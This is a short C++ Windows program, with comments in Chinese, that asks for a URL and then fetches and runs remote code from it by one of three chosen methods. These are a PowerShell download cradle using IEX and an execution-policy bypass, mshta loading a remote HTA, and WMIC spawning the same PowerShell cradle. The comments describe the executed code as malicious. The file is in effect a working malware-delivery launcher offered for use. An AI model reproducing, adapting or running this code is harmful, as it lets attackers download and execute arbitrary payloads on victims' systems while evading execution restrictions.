#include <windows.h>
#include <iostream>
#include <string>

//函数声明
void executePowerShell(const std::string& url);
void executeMSHTA(const std::string& url);
void executeWMIC(const std::string& url);

int main() {
    //设置控制台代码页为 UTF-8
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);

    std::string url;
    std::cout << "Please input HTTP URL address：" << std::endl;
    std::getline(std::cin, url);

    std::cout << "Choice Method：" << std::endl;
    std::cout << "1. PowerShell" << std::endl;
    std::cout << "2. MSHTA" << std::endl;
    std::cout << "3. WMIC" << std::endl;

    int choice;
    std::cin >> choice;

    switch (choice) {
    case 1:
        executePowerShell(url);
        break;
    case 2:
        executeMSHTA(url);
        break;
    case 3:
        executeWMIC(url);
        break;
    default:
        std::cout << "Null Choice" << std::endl;
    }

    return 0;
}

//使用PowerShell执行恶意代码
void executePowerShell(const std::string& url) {
    std::string command = "powershell -ExecutionPolicy Bypass -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('" + url + "')\"";
    system(command.c_str());
    std::cout << "PowerShell command execute." << std::endl;
}

//使用MSHTA执行恶意HTML应用程序
void executeMSHTA(const std::string& url) {
    std::string command = "mshta " + url;
    system(command.c_str());
    std::cout << "MSHTA command execute." << std::endl;
}

//使用WMIC执行恶意命令
void executeWMIC(const std::string& url) {
    std::string command = "wmic process call create \"powershell.exe -ExecutionPolicy Bypass -NoProfile -Command 'IEX (New-Object Net.WebClient).DownloadString('" + url + "')'\"";
    system(command.c_str());
    std::cout << "WMIC command execute." << std::endl;
}
